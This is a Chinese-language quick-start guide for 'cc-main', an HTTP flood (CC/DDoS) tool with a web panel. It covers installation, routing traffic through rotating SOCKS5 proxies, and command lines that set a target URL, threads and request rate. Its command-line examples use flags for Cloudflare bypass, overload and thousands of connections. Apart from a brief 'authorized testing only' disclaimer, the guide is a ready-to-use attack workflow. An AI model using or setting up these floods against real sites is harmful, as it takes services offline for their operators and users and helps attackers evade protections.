# 🚀 快速启动指南

## 一键安装并启动

### 1. 克隆项目
```bash
git clone https://github.com/wudi2898/cc-main.git
cd cc-main
```

### 2. 一键安装
```bash
sudo chmod +x install.sh
sudo ./install.sh
```

### 3. 访问Web面板
安装完成后，自动打开浏览器访问：
- **本地访问**: http://localhost:5000
- **远程访问**: http://你的IP:5000

## 管理命令

### 服务管理
```bash
cc-start      # 启动服务
cc-stop       # 停止服务
cc-restart    # 重启服务
cc-status     # 查看状态
cc-logs       # 查看日志
```

### 手动启动
```bash
# 前台启动
./start_panel.sh

# 后台启动
./start_panel.sh -b

# 调试模式
./start_panel.sh -d

# 指定端口
./start_panel.sh -p 8080
```

## 配置代理

### 编辑代理文件
```bash
sudo nano /opt/cc-main/config/socks5.txt
```

添加SOCKS5代理，每行一个：
```
127.0.0.1:1080
192.168.1.100:7890
proxy.example.com:1080
```

### 重启服务
```bash
cc-restart
```

## 使用Web面板

### 1. 创建任务
- 选择攻击模式：CC/GET/POST/HEAD
- 输入目标URL
- 设置线程数和RPS
- 配置高级参数

### 2. 启动任务
- 点击"启动任务"
- 实时查看日志
- 监控系统状态

### 3. 停止任务
- 点击"停止任务"
- 查看统计报告

## 命令行使用

### 基础攻击
```bash
# 进入安装目录
cd /opt/cc-main

# 激活虚拟环境
source venv/bin/activate

# 运行攻击
python3 main.py cc https://target.com 100 10
```

### 高级参数
```bash
python3 main.py cc https://target.com 500 50 \
  --cf-bypass \
  --overload \
  --fire-and-forget \
  --max-connections 5000
```

## 故障排除

### 服务未启动
```bash
# 查看状态
cc-status

# 查看日志
cc-logs

# 重启服务
cc-restart
```

### 代理连接失败
```bash
# 测试代理
python3 main.py check https://httpbin.org/ip 1 1

# 检查代理文件
cat /opt/cc-main/config/socks5.txt
```

### 端口被占用
```bash
# 查看端口占用
lsof -i :5000

# 使用其他端口
./start_panel.sh -p 8080
```

## 卸载

### 完全卸载
```bash
sudo ./uninstall.sh
```

## 注意事项

⚠️ **重要提醒**：
- 仅用于授权的安全测试
- 遵守当地法律法规
- 获得目标系统明确授权
- 承担使用后果和责任

## 技术支持

- **项目地址**: https://github.com/wudi2898/cc-main
- **问题反馈**: 提交Issue
- **功能建议**: 提交Pull Request